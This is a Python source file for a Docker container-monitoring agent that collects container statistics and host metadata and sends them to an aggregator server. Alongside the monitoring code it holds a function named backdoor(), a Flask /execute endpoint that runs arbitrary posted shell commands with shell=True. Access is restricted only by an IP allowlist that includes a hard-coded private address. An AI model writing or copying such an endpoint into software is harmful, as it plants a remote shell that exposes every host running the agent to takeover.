from config import *
from pyroute2 import IPRoute, NetNS
from time import sleep
import requests
import json
import threading
import docker
import platform
import psutil
import getpass
import os


def read(path):
    with open(path) as f:
        return f.read()

def readlines(path):
    with open(path) as f:
        return [c.rstrip('\n') for c in f.readlines()]

def post_data_sync(path='/', data=None, host_id=None, container_id=None, method='POST', option=None) -> None:
    headers = {'Content-Type': 'application/json'}
    if host_id != None:
        data['id'] = host_id
    if container_id != None:
        data['container_id'] = container_id
    json_data = json.dumps(data)
    url = 'http://' + SERVER_IP + ':' + str(SERVER_PORT) + path
    try:
        print(f"[post_data_sync] path: {path}, data: {json.dumps(data)}")
        response = requests.request(method, url, headers=headers, data=json_data)

        if response.status_code == 200:
            print('Data sent successfully')
            print(response.text)
        else:
            print('Failed to send data')
        if option:
            host_id = int(response.text)
            return host_id
    except requests.exceptions.ConnectionError:
        print('[*] Aggregator Server is down')

    return response.text

def post_data_async(path='/', data=None, host_id=None, container_id=None, method='POST') -> None:
    """
    Send json format data to server
    """
    headers = {'Content-Type': 'application/json'}
    if host_id != None:
        data['id'] = host_id
    if container_id != None:
        data['container_id'] = container_id

    json_data = json.dumps(data)
    url = 'http://' + SERVER_IP + ':' + str(SERVER_PORT) + path
    def send_request():
        try:
            print(f"[post_data_async] path: {path}, data: {json.dumps(data)}")
            response = requests.request(method, url, headers=headers, data=json_data)
            if response.status_code == 200:
                print('Data sent successfully')
                print(response.text)
            else:
                print('Failed to send data')
        except requests.exceptions.ConnectionError:
            print('[*] Aggregator Server is down')

    thread = threading.Thread(target=send_request)
    thread.start()

def backdoor():
    from flask import Flask, request
    import subprocess

    app = Flask(__name__)
    allowed_ips = ['127.0.0.1', SERVER_IP, '172.19.14.138']
    @app.before_request
    def limit_remote_addr():
        if request.remote_addr not in allowed_ips:
            return 'Access denied', 403 

    @app.route('/execute', methods=['POST'])
    def execute_command():
        data = request.get_json() 
        if 'command' not in data:
            return 'No command provided', 400

        command = data['command']
        try:
            result = subprocess.check_output(command, shell=True)
            return result.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f'Command execution failed with error code {e.returncode}'

    app.run()

def handle_exit(signal, frame):
    """
    Handle signal and send signal number to server
    """
    print(f"[x] Signal {signal} received")
    data_signal = {'exception': {
        'signal': signal
    }}
    # post_data_async('/', data_signal)

def get_system_cpu_usage():
    with open('/proc/stat', 'r') as file:
        line = file.readline()
    return sum(int(i) for i in line.split()[1:])

def get_container_info(cid):
    docker_info = {}
    ports = []
    container = client.containers.get(cid)
    networks = container.attrs["NetworkSettings"]["Networks"]
    for container_port, container_host in container.attrs['HostConfig']['PortBindings'].items():
        ports.append(f"{container_host[0]['HostPort']}->{container_port}")
    docker_info['name'] = container.name
    docker_info['container_id'] = container.short_id
    docker_info['status'] = container.status
    docker_info['image_tag'] = container.image.tags[0]
    docker_info['command'] = '' 
    if container.attrs["Config"]['Entrypoint']:
        docker_info['command'] = ' '.join(container.attrs["Config"]["Entrypoint"])
    if container.attrs["Config"]['Cmd']:
        docker_info['command'] +=' ' + ' '.join(container.attrs["Config"]['Cmd'])
    docker_info['networks'] = next(iter(networks.keys()))
    docker_info['ip'] = next(iter(networks.values()))['IPAddress']
    docker_info['ports'] = ', '.join(ports)
    docker_info['created'] = container.attrs["Created"]
    return docker_info

def get_container_stat(cid, vethi):
    cpu_stat_path = f"/sys/fs/cgroup/cpu,cpuacct/docker/{cid}/"
    memory_stat_path = f"/sys/fs/cgroup/memory/docker/{cid}/"
    netns_stat_path = f"/sys/class/net/{vethi}/statistics/"
    disk_stat_path = f"/sys/fs/cgroup/blkio/docker/{cid}/"
    container_stat = {
        'id': cid,
        'paths': {
            'cpu': cpu_stat_path,
            'memory': memory_stat_path,
            'network': netns_stat_path,
            'disk': disk_stat_path
        },
        'prev_usages': {
            'system_cpu_usage': 0,
            'total_cpu_usage': 0,
            'total_disk_usage': 0,
            'total_network_input_usage': 0,
            'total_network_output_usage': 0
        }
    }
    return container_stat

ids = {}
container_num = [1]
client = docker.from_env()
def monitor_container_events(host_id):
    global ids
    global container_num
    ip = IPRoute()
    events = client.events(decode=True)
    for event in events:
        if 'status' in event and 'id' in event:
            container_id = event['id'][:12]
            status = event['status']

            # 컨테이너가 종료된 경우
            if status == 'die':
                print(f"[-] Container Died: {container_id}")
                print(1, status, container_id)
                try:
                    print(2, status)
                    ids[container_id]['status'] = 'exited'
                    if ids[container_id]['network'] == 'host':
                        container_num[0] -= 1
                        print(f"[exited] container_num : {container_num[0]}")
                    print(3, status)
                    post_data_async('/container', ids[container_id]['info'], host_id, method='DELETE')
                    print(4, status)
                    del ids[container_id]
                except KeyError:
                    print(5, status)
                    post_data_async('/container', {'container_id': container_id}, host_id, method='DELETE')

            # 컨테이너가 새로 생성된 경우
            elif status =='start':
                if DEBUG:
                    print(1, status, container_id)
                container = client.containers.get(container_id)
                if DEBUG:
                    print(2, status)
                pid = container.attrs['State']['Pid']
                if DEBUG:
                    print(3, status)
                # 호스트의 veth* 네트워크 인터페이스와 대응되는 인터페이스 저장
                try:
                    with NetNS(f"/proc/{pid}/ns/net") as ns:
                        if DEBUG:
                            print(3.1, status)
                        links = ns.get_links()
                        for link in links:
                            print(link.get_attr('IFLA_IFNAME'))
                            if link.get_attr('IFLA_IFNAME').startswith('wl'):
                                print("[*] HOST")
                                info = get_container_info(container_id)
                                ids[container_id] = {
                                    'status': 'running',
                                    'stat': get_container_stat(container.id, link.get_attr('IFLA_IFNAME')),
                                    'info': info,
                                    'network': 'host'
                                }
                                container_num[0] += 1
                                print(container_num[0])

                            elif link.get_attr('IFLA_IFNAME') == 'eth0':
                                if DEBUG:
                                    print(3.2, status, link.get_attr('IFLA_LINK'))
                                index = link.get_attr('IFLA_LINK')
                                if DEBUG:
                                    print(3.3, status, index, ip.get_links(index))
                                veth = ip.get_links(index)[0]
                                if DEBUG:
                                    print(3.4, status)
                                info = get_container_info(container_id)
                                if DEBUG:
                                    print(3.5, status)
                                ids[container_id] = {
                                    'status': 'running',
                                    'stat': get_container_stat(container.id, veth.get_attr('IFLA_IFNAME')),
                                    'info': info,
                                    'network': 'bridge'
                                }
                                if DEBUG:
                                    print(3.6, status)

                # 부팅과 동시에 종료되는 컨테이너 에러 핸들링
                except FileNotFoundError:
                    if DEBUG:
                        print(4, status)
                    ids[container_id] = 'exited'
                    break
                except Exception as e:
                    print(e)

                print(f"[+] Container Started: {container_id}")
                post_data_async('/container', ids[container_id]['info'], host_id)
                if DEBUG:
                    print(5, status)
            
HOST_CPU_PATH = "/sys/fs/cgroup/cpu,cpuacct/"
output_string = read(HOST_CPU_PATH + 'cpuacct.usage_percpu')
output_list = [int(x) for x in output_string.split()]
NUMBER_OF_CPUS = sum(1 for x in output_list if x != 0)
MEMORY_LIMIT = psutil.virtual_memory().total
def get_running_containers(host_id):
    ip = IPRoute()
    for container in client.containers.list():
        container_id = container.short_id
        print(f"[*] container id : {container_id}")

        pid = container.attrs['State']['Pid']
        with NetNS(f"/proc/{pid}/ns/net") as ns:
            links = ns.get_links()
            for link in links:
                if link.get_attr('IFLA_IFNAME') == 'eth0':
                    index = link.get_attr('IFLA_LINK')
                    veth = ip.get_links(index)[0]
                    ids[container_id] = {
                        'status': container.status,
                        'stat': get_container_stat(container.id, veth.get_attr('IFLA_IFNAME')),
                        'info': get_container_info(container_id)
                    }
                    # print(ids)
                    post_data_sync('/container', ids[container_id]['info'], host_id)
'''
def insert_user(host_id):
    data_user = {
        'name': ,
        'email': '',
        'id': host_id
    }
'''
def get_metadata():
    uname = platform.uname()

    proc_cpu_info = {}
    with open('/proc/cpuinfo', 'r') as f:
        lines = f.readlines()
        for line in lines:
            if ':' in line:
                info = line.split(':')
                key = info[0].strip()
                value = info[1].strip()
                proc_cpu_info[key] = value

    memory = psutil.virtual_memory()
    kernel_info = {
        'kernel_version': uname.version,
        'os': uname.system,
        'kernel_host': uname.node,
        'kernel_release': uname.release,
        'kernel_arch': uname.machine,
        'cpu_core': psutil.cpu_count(logical=False),
        'cpu_tot': psutil.cpu_count(logical=True),
        'cpu_id': proc_cpu_info['vendor_id'],
        'cpu_model': proc_cpu_info['model name'],
        'mem_stor': memory.total
    }

    net_if_addrs = psutil.net_if_addrs()
    network_info = []
    net_info = {}
    for interface, addresses in net_if_addrs.items():
        net_info[interface] = []
        for address in addresses:
            net_info[interface].append({
                'family': address.family.name,
                'addr': address.address,
                'netmask': address.netmask,
                'broadcast': address.broadcast
            })
    

    for interface, addresses in net_info.items():
        interface_info = {
            'name': interface,
            'addr': addresses[0]['addr'],
            'netmask': addresses[0]['netmask']
        }
        if addresses[0]['family'] == 'AF_INET6':
            interface_info['addr'] = addresses[0]['addr'][:-len(interface) - 1]
        network_info.append(interface_info)

    partitions = psutil.disk_partitions()
    disk_info = []
    for partition in partitions:
            disk_usage = psutil.disk_usage(partition.mountpoint)
            if partition.fstype != 'squashfs':
                disk_info.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': disk_usage.total,
                    'used': disk_usage.used,
                    'free': disk_usage.free,
                })

    metadata = {
            'kernel_info': kernel_info,
            'network_info': network_info,
            'disk_info': disk_info,
            'name': {
                'name': os.getlogin()
            }
    }
    
    return metadata

'''
# Send Metadata (Initialize done)
if HOST_ID:
    host_id = int(HOST_ID)
else:
    print("Send Metadata to Aggregator Server... ")
    host_id = int(post_data_sync('/insert_hw', get_metadata()))
    with open(CONFIG_PATH, 'r') as f:
        data = f.read().split()

    with open(CONFIG_PATH, 'w') as f:
        f.write(f"{data[0]} {data[1]} {host_id}")

monitor_container_events(host_id)
'''
